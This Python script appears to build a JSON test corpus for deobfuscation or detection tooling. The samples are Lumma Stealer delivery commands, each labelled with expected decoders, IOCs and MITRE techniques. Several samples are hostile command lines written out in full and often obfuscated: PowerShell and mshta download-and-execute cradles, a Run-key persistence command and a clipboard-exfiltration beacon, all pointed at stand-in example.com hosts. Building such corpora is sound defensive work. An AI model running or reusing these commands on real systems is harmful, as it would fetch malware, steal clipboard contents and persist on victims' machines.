"""
Phase R1 \u00b7 Lumma Stealer family sample builder (technique-first).

Lumma Stealer (aka LummaC2 / Lumma) is a MaaS infostealer marketed on
Russian-language forums since 2022. Distributed via
crack/warez sites, YouTube video descriptions, and fake CAPTCHA
("ClickFix") pages, it exfiltrates browser credentials, crypto wallet
files, and clipboard contents.

This pack focuses on the deterministic PowerShell / MSHTA / CMD sides
of Lumma delivery observed in public IR reports (Sekoia 2023-2024,
S2 Grupo, Cyfirma, Trellix, Trend Micro). Native .exe unpacking and
Lumma-specific in-memory RC4 unwrap are NOT in scope for this pack
\u2014 they're declared explicit coverage gaps.
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "lumma_stealer.json"


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _sample(sid, variant, input_str, interpreter, final_interpreter,
            decoder_chain, final_output_contains, iocs_contains,
            mitre_attack, behaviors):
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


TECHNIQUES: list[dict] = [
    # ---- Technique 1: ClickFix / FakeCaptcha PowerShell paste --------
    {
        "id": "clickfix_powershell_paste",
        "display_name": "ClickFix / FakeCaptcha PowerShell Paste",
        "description": (
            "Lumma's dominant 2024 delivery vector: a fake 'I am not a "
            "robot' CAPTCHA page instructs the victim to paste a "
            "prepared PowerShell command into a Run dialog. Observed "
            "extensively by Trellix, Cyfirma, and Sekoia."
        ),
        "mitre_attack": ["T1204.004", "T1059.001", "T1105"],
        "samples": [
            _sample(
                "LU001", "clickfix_iex_downloadstring",
                "IEX ((New-Object Net.WebClient).DownloadString('http://lumma-clickfix.example.com/verify.ps1'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://lumma-clickfix.example.com/verify.ps1"],
                ["http://lumma-clickfix.example.com/verify.ps1"],
                ["T1204.004", "T1059.001", "T1105"],
                ["download_and_execute", "clickfix_delivery"],
            ),
            _sample(
                "LU002", "clickfix_iwr_useb_iex",
                "iwr https://lumma-fakecaptcha.example.net/robot_check.ps1 -useb | iex",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "https://lumma-fakecaptcha.example.net/robot_check.ps1", "Invoke-Expression"],
                ["https://lumma-fakecaptcha.example.net/robot_check.ps1"],
                ["T1204.004", "T1059.001", "T1105"],
                ["download_and_execute", "clickfix_delivery"],
            ),
        ],
    },
    # ---- Technique 2: MSHTA cradle (older Lumma delivery) ------------
    {
        "id": "mshta_cradle",
        "display_name": "mshta.exe Cradle",
        "description": (
            "Older Lumma delivery via mshta.exe fetching a .hta/.js. "
            "mshta cradle observed by S2 Grupo Q3-2023 reports."
        ),
        "mitre_attack": ["T1218.005", "T1059.001", "T1105"],
        "samples": [
            _sample(
                "LU003", "mshta_powershell_enc",
                "mshta.exe http://lumma-mshta.example.com/gate.hta",
                "cmd", "mshta",
                [],
                ["mshta.exe", "http://lumma-mshta.example.com/gate.hta"],
                ["http://lumma-mshta.example.com/gate.hta"],
                ["T1218.005", "T1105"],
                ["mshta_delivery", "lolbas_execution"],
            ),
        ],
    },
    # ---- Technique 3: PowerShell -EncodedCommand next-stage ----------
    {
        "id": "powershell_encodedcommand_stage",
        "display_name": "PowerShell -EncodedCommand Stealer Staging",
        "description": (
            "Lumma stage-2: base64-UTF16LE-wrapped IEX cradle "
            "retrieves the actual stealer binary from a rotating C2."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "LU004", "encodedcommand_iex_stealer_c2",
                "powershell -EncodedCommand " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://lumma-c2.example.com/stealer.ps1'))"
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://lumma-c2.example.com/stealer.ps1"],
                ["http://lumma-c2.example.com/stealer.ps1"],
                ["T1059.001", "T1027", "T1140", "T1105"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "LU005", "encodedcommand_hidden_stealer_persistence",
                "powershell -NoP -W Hidden -Enc " + _b64_utf16le(
                    'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name LumaSvc -Value "powershell -w hidden -c IEX ((New-Object Net.WebClient).DownloadString(\'http://lumma-p.example.com/stealer.ps1\'))"'
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode"],
                ["Set-ItemProperty", "CurrentVersion\\Run", "LumaSvc", "http://lumma-p.example.com/stealer.ps1"],
                ["http://lumma-p.example.com/stealer.ps1"],
                ["T1059.001", "T1027", "T1547.001", "T1564.003", "T1105"],
                ["registry_run_key_persistence", "download_and_execute", "hidden_window"],
            ),
        ],
    },
    # ---- Technique 4: Clipboard-monitor beacon PowerShell -----------
    {
        "id": "clipboard_monitor_beacon",
        "display_name": "Clipboard Monitor Beacon",
        "description": (
            "Lumma clipboard monitor: a hidden PowerShell loop that "
            "reads the clipboard and beacons the contents to the C2 "
            "for wallet-address-replacement or credential exfil."
        ),
        "mitre_attack": ["T1115", "T1059.001", "T1105"],
        "samples": [
            _sample(
                "LU006", "encodedcommand_clipboard_loop",
                "powershell -EncodedCommand " + _b64_utf16le(
                    "while($true) { $c = Get-Clipboard; IEX ((New-Object Net.WebClient).DownloadString('http://lumma-clip.example.com/beacon?clip='+$c)); Start-Sleep -Seconds 30 }"
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Get-Clipboard", "http://lumma-clip.example.com/beacon", "Start-Sleep"],
                ["http://lumma-clip.example.com/beacon"],
                ["T1115", "T1059.001", "T1027", "T1105"],
                ["clipboard_monitor", "beacon_c2", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 5: CMD caret \u2192 PS handoff ------------------------
    {
        "id": "cmd_caret_powershell_handoff",
        "display_name": "CMD Caret \u2192 PowerShell Launcher",
        "description": (
            "Fake-installer .bat launches PowerShell via caret-obfuscated "
            "cmd shim to defeat signature-based EDR at the CMD layer."
        ),
        "mitre_attack": ["T1059.001", "T1059.003", "T1027.010", "T1140", "T1105"],
        "samples": [
            _sample(
                "LU007", "cmd_caret_ps_enc_lumma_launcher",
                "c^m^d /c p^ow^ers^he^ll -e^nc " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://lumma-launch.example.com/lumma_stealer.ps1'))"
                ),
                "cmd", "powershell",
                ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://lumma-launch.example.com/lumma_stealer.ps1"],
                ["http://lumma-launch.example.com/lumma_stealer.ps1"],
                ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
                ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 6: String-concat URL obfuscation ------------------
    {
        "id": "string_concat_url_obfuscation",
        "display_name": "URL String-Concat Obfuscation",
        "description": (
            "URL for the stealer binary reconstructed from SQ concat "
            "fragments so static URL extraction fails."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "LU008", "three_var_stealer_binary_url",
                "$a='ht'; $b='tp://lumma-split.example.com'; $c='/lumma.exe'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://lumma-split.example.com/lumma.exe"],
                ["http://lumma-split.example.com/lumma.exe"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 7: Backtick alias obfuscation --------------------
    {
        "id": "backtick_alias_obfuscation",
        "display_name": "Backtick Alias Obfuscation",
        "description": (
            "Backticks injected mid-identifier (`i\u0060w\u0060r`, "
            "`i\u0060e\u0060x`) to evade string-match signatures."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "LU009", "backtick_iwr_useb_iex",
                "i`wr 'http://lumma-bt.example.com/lumma_bt.ps1' -useb | i`ex",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-WebRequest", "http://lumma-bt.example.com/lumma_bt.ps1", "Invoke-Expression"],
                ["http://lumma-bt.example.com/lumma_bt.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
        ],
    },
    # ---- Technique 8: Shellcode staging via FromBase64String --------
    {
        "id": "frombase64string_shellcode_staging",
        "display_name": "[Convert]::FromBase64String Shellcode Staging",
        "description": (
            "Lumma's fallback in-memory delivery: `$b = [Convert]::"
            "FromBase64String('...'); IEX $b` after the initial "
            ".exe fails to write to disk (AV interference)."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "LU010", "frombase64string_inmemory_stealer",
                "$b = [Convert]::FromBase64String('"
                + base64.b64encode(
                    b"IEX ((New-Object Net.WebClient).DownloadString('http://lumma-b64.example.com/final_stealer.ps1')); "
                ).decode("ascii")
                + "'); IEX $b",
                "powershell", "powershell",
                ["decoder-frombase64string-fold", "alias-expand"],
                ["Invoke-Expression", "http://lumma-b64.example.com/final_stealer.ps1"],
                ["http://lumma-b64.example.com/final_stealer.ps1"],
                ["T1059.001", "T1105", "T1027", "T1140"],
                ["download_and_execute", "shellcode_staging"],
            ),
        ],
    },
]


# ---- Explicit coverage gaps (script/binary layers we do not model yet) ----
COVERAGE_GAP_TECHNIQUES: list[str] = [
    "native_exe_unpacking",         # Lumma stealer is a native .exe
    "lumma_rc4_string_decrypt",     # RC4 keys embedded in binary
    "vidar_style_c2_config_pull",   # Vidar-family telegram config
]


def build() -> dict:
    known_universe = sorted(
        {t["id"] for t in TECHNIQUES} | set(COVERAGE_GAP_TECHNIQUES)
    )
    return {
        "family_id": "lumma_stealer",
        "family_display_name": "Lumma Stealer",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "Lumma Stealer (LummaC2) commodity infostealer distributed "
            "via ClickFix / fake-CAPTCHA, warez sites, and YouTube "
            "descriptions. This pack covers the deterministic "
            "PowerShell / MSHTA / CMD delivery layers observed in "
            "public IR reports."
        ),
        "primary_mitre_attack": [
            "T1204.004", "T1218.005", "T1059.001", "T1059.003",
            "T1027", "T1027.010", "T1140", "T1115", "T1105",
            "T1547.001", "T1564.003",
        ],
        "primary_behaviors": [
            "clickfix_delivery",
            "clipboard_monitor",
            "download_and_execute",
            "cmd_to_ps_handoff",
            "obfuscated_command_line",
            "registry_run_key_persistence",
            "beacon_c2",
            "mshta_delivery",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": sorted(COVERAGE_GAP_TECHNIQUES),
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    print(
        f"Wrote {sample_count} Lumma-Stealer samples across "
        f"{len(payload['techniques'])} techniques "
        f"({len(payload['coverage_gap_techniques'])} declared coverage gaps) "
        f"to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
